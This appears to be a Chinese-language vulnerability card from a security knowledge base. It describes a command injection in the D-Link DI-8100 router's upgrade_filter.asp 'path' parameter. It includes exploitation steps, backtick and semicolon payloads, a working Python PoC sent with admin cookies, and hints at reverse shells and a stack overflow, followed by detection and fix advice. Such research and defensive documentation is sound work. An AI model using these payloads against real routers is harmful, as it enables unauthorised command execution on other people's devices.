---
id: iot-dlink-di8100-upgrade-filter-asp-path-command-injection
title: D-Link DI-8100 upgrade_filter_asp path 命令注入：以 http:// 开头的 path 拼入 system 的 wys wget download
type: scenario
domain: iot
path: iot
technique: dlink-di8100-upgrade-filter-asp-path-system-command-injection
aliases:
- D-Link DI-8100 第二个命令执行
- upgrade_filter.asp
- upgrade_filter_asp
- path 命令注入
- wys wget download
- jhttpd 命令注入
tags:
- iot
- dlink
- router
- firmware
- cgi
- command-injection
- mips
- upgrade
cve: []
affected_versions: D-Link DI-8100 16.07 / 固件 16.07.26A1（原文复现固件）
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V263
  verified_at: '2026-11-07T17:26:48+08:00'
  notes: V263 复核：已完整重读 content.md 与全部46张图。图16 伪代码显示 upgrade_filter_asp 取 path 后 strcpy 到 512 字节栈缓冲 v17、memcmp(v17,"http://",7) 前缀检查，再 sprintf(v16,"wys wget download %s",param) 与 system(v16)，与卡内原理一致；URL path=http://`ps%20%3e%20/xidp.txt` 与图17/18 一致，xidp.txt 落地 ps 输出。affected_versions D-Link DI-8100 16.07（固件16.07.26A1）与原文一致。dedup 最高分为卡自身 exact；dup-scan pair2（vs 18496 DIR-615/645/815 service.cgi，likely_duplicate）经原文对比：不同产品系列（DI-8100/jhttpd vs DIR-615/645/815/cgibin）、不同入口与参数（/upgrade_filter.asp?path 且需 http:// 前缀 vs REQUEST_URI 中 EVENT/ACTION/SERVICE）、不同 sink 模板（wys wget download %s vs event/service %s ...）、不同编号（VDB-273521系 vs CNVD-2018-01084），非同一利用链，不删除；pair10（msp_info vs service.cgi）为 related。未本地复跑 PoC；frontmatter 无 sources/source（符合 add 校验禁用要求），亦无 source_url。
---

## 一句话结论

D-Link DI-8100 的 `jhttpd` 在 `upgrade_filter.asp` 处理函数 `upgrade_filter_asp` 中，把 `path` 参数（需以 `http://` 开头）`sprintf` 进 `"wys wget download %s"` 后交给 `system()` 执行；在合法 URL 后拼接反引号/分号等 shell 元字符即可注入任意命令，是同一固件中除 `msp_info_htm` 之外的第二条命令注入。

## 原理

- `upgrade_filter_asp` 用 `httpd_get_parm(a1, "path")` 取 `path`，先 `strcpy` 到 512 字节栈缓冲 `v17`，并用 `memcmp(v17, "http://", 7)` 判断是否以 `http://` 开头；只有通过该前缀检查才会继续。
- 通过检查后，函数执行 `sprintf(v16, "wys wget download %s", param)`，再 `system(v16)`。`%s` 是原始 `path`，`system()` 走 `/bin/sh -c`，因此 URL 中的反引号（命令替换）、分号、管道等会被 shell 解释，形成命令注入。
- 前缀检查只约束字符串开头，不限制后续字符；payload 可以写成 `http://<正常主机或空>；<命令>` 或 `http://`<命令>``，既满足 `http://` 前缀，又能注入。
- 原文用 `path=http://`ps > /xidp.txt`` 验证：`system` 执行 `wys wget download http://`ps > /xidp.txt``，反引号中的 `ps > /xidp.txt` 先执行，根目录生成 `xidp.txt`，`cat` 可见进程列表。
- 该函数还把 `param` 通过 `strcpy` 复制进 512 字节栈缓冲，超长 `path` 可能造成栈溢出（原文未验证，仅作为边界提示）。

## 触发条件

- 目标为 D-Link DI-8100 16.07（原文固件 16.07.26A1），Web 管理面可访问。
- 需要有效管理员会话：请求携带登录后的 `wys_userid`/`wys_passwd` Cookie。
- `path` 参数必须以 `http://` 开头以通过前缀检查；注入内容放在其后。
- 设备可写文件系统或可执行反弹命令，用于验证。

## 利用步骤

1. 登录管理界面并抓取 Cookie（原文 exp 复用 `wys_userid`/`wys_passwd`）。
2. 构造 `path`：以 `http://` 开头，后接反引号包裹的命令，例如 ``http://`ps%20%3e%20/xidp.txt` ``；或 `http://;id;/`。
3. 发送 `GET /upgrade_filter.asp?path=<URL 编码 payload>`，带管理员 Cookie。
4. 函数通过 `http://` 检查后拼出 `wys wget download <path>` 并 `system()`；反引号/分号中的命令执行。
5. 在设备 shell 中 `ls` 看到 `xidp.txt`，`cat xidp.txt` 可见 `ps` 输出；若需回显，可写 Web 目录文件后从浏览器访问，或反弹 shell。
6. 注意 `path` 长度不要触发 512 字节 `strcpy` 溢出（除非有意利用栈溢出）。

## PoC

```python
import requests

target = "http://192.168.0.1:80/upgrade_filter.asp?path=http://`ps%20%3e%20/xidp.txt`"
cookies = {"uid": "h3r4yvoOTp", "wys_userid": "admin,wys_passwd=520E1BFD4CDE217D0A5824AE7EA60632"}
headers = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*",
    "Connection": "keep-alive",
}
r = requests.get(target, headers=headers, cookies=cookies)
print(r.status_code, "攻击载荷已发送")
```

```text
# 设备侧验证
/ # ls
... xidp.txt ...
/ # cat xidp.txt
  PID PPID USER  VSZ STAT COMMAND
    1    0 admin 1676 S    /firmadyne/sh /firmadyne/preInit.sh
    ...
```

## 变体与关联

- 变体：`path` 前缀也可用大小写/协议变体尝试绕过前缀检查；若目标只允许 `http://`，仍可在其后用 `;`、`|`、`&&`、反引号注入。
- 变体：超长 `path` 可触发 `strcpy` 到 512 字节栈缓冲的溢出，是潜在的第二条漏洞路径（未验证）。
- 关联：[[iot-dlink-di8100-msp-info-htm-cmd-command-injection]]（同固件 `msp_info_htm` 的 `cmd` 命令注入）、[[iot-dlink-dir615-645-815-service-cgi-event-command-injection]]（D-Link 另一系列 CGI 命令注入）、[[code-analysis-reverse-firmware-qemu-system-mipsel-router-httpd]]（固件仿真方法）。
- 边界：需要管理员 Cookie；`wys wget download` 实际会先尝试下载，注入命令在 shell 解析阶段即执行；不同固件版本函数名/参数可能变化。

## 检测与防御

- 检测：`upgrade_filter.asp` 的 `path` 参数含反引号/分号/管道/`$(`，或 `path` 远超正常 URL 长度；`jhttpd` 派生 `wget`/shell 子进程；根目录或 Web 目录出现异常文件。
- 修复：升级厂商修复固件；限制管理面仅内网访问；对 `path` 做严格 URL 解析与字符白名单，拒绝 shell 元字符。
- 代码层：不要用 `sprintf`/`system` 拼接 URL；改用 `execve` 固定参数（`wget`、`download`、URL 分离），并对长度做边界检查。
- 加固：Web 服务降权、管理面与 WAN 隔离、固件签名与安全启动。
